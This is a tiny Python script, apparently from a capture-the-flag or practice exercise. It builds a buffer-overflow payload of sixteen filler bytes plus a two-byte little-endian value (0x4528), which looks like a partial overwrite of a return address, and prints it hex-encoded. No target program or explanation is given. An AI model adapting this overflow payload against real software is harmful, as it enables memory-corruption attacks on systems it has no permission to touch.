#!/usr/bin/env python

import binascii
import struct

pad=b'a'*0x10
pad+=struct.pack('<H', 0x4528)
res=binascii.hexlify(pad)
print(res.decode())



